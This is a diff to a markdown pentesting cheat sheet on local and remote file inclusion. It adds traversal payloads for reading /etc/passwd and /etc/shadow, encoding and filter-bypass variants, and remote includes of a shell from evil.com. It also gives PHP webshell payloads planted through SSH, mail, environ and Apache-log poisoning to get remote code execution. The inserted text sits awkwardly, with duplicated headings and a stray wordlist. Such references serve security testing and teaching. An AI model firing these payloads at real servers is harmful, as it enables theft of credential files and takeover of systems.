@@ -855,11 +855,132 @@ file, document, folder, root, path, pg, style, pdf, template, php_path, doc, con
 ```
 
 ### **Basic LFI Exploitation:**
-```bash
-http://example.com/index.php?page=../../../etc/passwd
-http://example.com/index.php?page=../../../../../../etc/shadow
+
+## Summary
+
+- [Tools](#tools)
+- [Local File Inclusion](#local-file-inclusion)
+    - [Null Byte](#null-byte)
+    - [Double Encoding](#double-encoding)
+    - [UTF-8 Encoding](#utf-8-encoding)
+    - [Path Truncation](#path-truncation)
+    - [Filter Bypass](#filter-bypass)
+- [Remote File Inclusion](#remote-file-inclusion)
+    - [Null Byte](#null-byte-1)
+    - [Double Encoding](#double-encoding-1)
+    - [Bypass allow_url_include](#bypass-allow_url_include)
+- [Labs](#labs)
+- [References](#references)
+
+## Tools
+
+- [P0cL4bs/Kadimus](https://github.com/P0cL4bs/Kadimus) (archived on Oct 7, 2020) - kadimus is a tool to check and exploit lfi vulnerability.
+- [D35m0nd142/LFISuite](https://github.com/D35m0nd142/LFISuite) - Totally Automatic LFI Exploiter (+ Reverse Shell) and Scanner
+- [kurobeats/fimap](https://github.com/kurobeats/fimap) - fimap is a little python tool which can find, prepare, audit, exploit and even google automatically for local and remote file inclusion bugs in webapps.
+- [lightos/Panoptic](https://github.com/lightos/Panoptic) - Panoptic is an open source penetration testing tool that automates the process of search and retrieval of content for common log and config files through path traversal vulnerabilities.
+- [hansmach1ne/LFImap](https://github.com/hansmach1ne/LFImap) - Local File Inclusion discovery and exploitation tool
+
+## Local File Inclusion
+
+**File Inclusion Vulnerability** should be differentiated from **Path Traversal**. The Path Traversal vulnerability allows an attacker to access a file, usually exploiting a "reading" mechanism implemented in the target application, when the File Inclusion will lead to the execution of arbitrary code.
+
+Consider a PHP script that includes a file based on user input. If proper sanitization is not in place, an attacker could manipulate the `page` parameter to include local or remote files, leading to unauthorized access or code execution.
+
+```php
+<?php
+$file = $_GET['page'];
+include($file);
+?>
 ```
 
+In the following examples we include the `/etc/passwd` file, check the `Directory & Path Traversal` chapter for more interesting files.
+
+```powershell
+http://example.com/index.php?page=../../../etc/passwd
+```
+
+### Null Byte
+
+:warning: In versions of PHP below 5.3.4 we can terminate with null byte (`%00`).
+
+```powershell
+http://example.com/index.php?page=../../../etc/passwd%00
+```
+
+**Example**: Joomla! Component Web TV 1.0 - CVE-2010-1470
+
+```ps1
+{{BaseURL}}/index.php?option=com_webtv&controller=../../../../../../../../../../etc/passwd%00
+```
+
+### Double Encoding
+
+```powershell
+http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
+http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
+```
+
+### UTF-8 Encoding
+
+```powershell
+http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
+http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00
+```
+
+### Path Truncation
+
+On most PHP installations a filename longer than `4096` bytes will be cut off so any excess chars will be thrown away.
+
+```powershell
+http://example.com/index.php?page=../../../etc/passwd............[ADD MORE]
+http://example.com/index.php?page=../../../etc/passwd\.\.\.\.\.\.[ADD MORE]
+http://example.com/index.php?page=../../../etc/passwd/./././././.[ADD MORE] 
+http://example.com/index.php?page=../../../[ADD MORE]../../../../etc/passwd
+```
+
+### Filter Bypass
+
+```powershell
+http://example.com/index.php?page=....//....//etc/passwd
+http://example.com/index.php?page=..///////..////..//////etc/passwd
+http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
+```
+
+## Remote File Inclusion
+
+> Remote File Inclusion (RFI) is a type of vulnerability that occurs when an application includes a remote file, usually through user input, without properly validating or sanitizing the input.
+
+Remote File Inclusion doesn't work anymore on a default configuration since `allow_url_include` is now disabled since PHP 5.
+
+```ini
+allow_url_include = On
+```
+
+Most of the filter bypasses from LFI section can be reused for RFI.
+
+```powershell
+http://example.com/index.php?page=http://evil.com/shell.txt
+```
+
+### Null Byte
+
+```powershell
+http://example.com/index.php?page=http://evil.com/shell.txt%00
+```
+
+### Double Encoding
+
+```powershell
+http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt
+```
+
+### Bypass allow_url_include
+
+When `allow_url_include` and `allow_url_fopen` are set to `Off`. It is still possible to include a remote file on Windows box using the `smb` protocol.
+
+1. Create a share open to everyone
+2. Write a PHP code inside a file : `shell.php`
+3. Include it `http://example.com/index.php?page=\\10.0.0.1\share\shell.php`
 ### **Basic RFI Exploitation:**
 ```bash
 http://example.com/index.php?page=http://evil.com/shell.txt
@@ -874,6 +995,112 @@ http://example.com/index.php?page=http://evil.com/shell.txt
 - [Kadimus](https://github.com/P0cL4bs/Kadimus)
 - [LFISuite](https://github.com/D35m0nd142/LFISuite)
 - [fimap](https://github.com/kurobeats/fimap)
+
+etc/passwd
+etc/passwd%00
+etc%2fpasswd
+etc%2fpasswd%00
+etc%5cpasswd
+etc%5cpasswd%00
+etc%c0%afpasswd
+etc%c0%afpasswd%00
+C:\boot.ini
+C:\WINDOWS\win.ini
+C:/apache2/log/access_log
+C:/apache2/log/error.log
+C:/apache2/log/error_log
+C:/documents and settings/administrator/desktop/desktop.ini
+
+## LFI to RCE via /proc/*/fd
+
+1. Upload a lot of shells (for example : 100)
+2. Include `/proc/$PID/fd/$FD` where `$PID` is the PID of the process and `$FD` the filedescriptor. Both of them can be bruteforced.
+
+```ps1
+http://example.com/index.php?page=/proc/$PID/fd/$FD
+```
+
+## LFI to RCE via /proc/self/environ
+
+Like a log file, send the payload in the `User-Agent` header, it will be reflected inside the `/proc/self/environ` file
+
+```powershell
+GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
+User-Agent: <?=phpinfo(); ?>
+```
+## LFI to RCE via upload
+
+If you can upload a file, just inject the shell payload in it (e.g : `<?php system($_GET['c']); ?>` ).
+
+```powershell
+http://example.com/index.php?page=path/to/uploaded/file.png
+```
+## LFI to RCE via phpinfo()
+
+PHPinfo() displays the content of any variables such as **$_GET**, **$_POST** and **$_FILES**.
+
+> By making multiple upload posts to the PHPInfo script, and carefully controlling the reads, it is possible to retrieve the name of the temporary file and make a request to the LFI script specifying the temporary file name.
+
+Use the script [phpInfoLFI.py](https://www.insomniasec.com/downloads/publications/phpinfolfi.py)
+
+### RCE via SSH
+
+Try to ssh into the box with a PHP code as username `<?php system($_GET["cmd"]);?>`.
+
+```powershell
+ssh <?php system($_GET["cmd"]);?>@10.10.10.10
+```
+
+Then include the SSH log files inside the Web Application.
+
+```powershell
+http://example.com/index.php?page=/var/log/auth.log&cmd=id
+```
+
+### RCE via Mail
+
+First send an email using the open SMTP then include the log file located at `http://example.com/index.php?page=/var/log/mail`.
+
+```powershell
+root@kali:~# telnet 10.10.10.10. 25
+Trying 10.10.10.10....
+Connected to 10.10.10.10..
+Escape character is '^]'.
+220 straylight ESMTP Postfix (Debian/GNU)
+helo ok
+250 straylight
+mail from: mail@example.com
+250 2.1.0 Ok
+rcpt to: root
+250 2.1.5 Ok
+data
+354 End data with <CR><LF>.<CR><LF>
+subject: <?php echo system($_GET["cmd"]); ?>
+data2
+.
+```
+
+In some cases you can also send the email with the `mail` command line.
+
+```powershell
+mail -s "<?php system($_GET['cmd']);?>" www-data@10.10.10.10. < /dev/null
+```
+
+### RCE via Apache logs
+
+Poison the User-Agent in access logs:
+
+```ps1
+curl http://example.org/ -A "<?php system(\$_GET['cmd']);?>"
+```
+
+Note: The logs will escape double quotes so use single quotes for strings in the PHP payload.
+
+Then request the logs via the LFI and execute your command.
+
+```ps1
+curl http://example.org/test.php?page=/var/log/apache2/access.log&cmd=id
+```
 
 ---
 
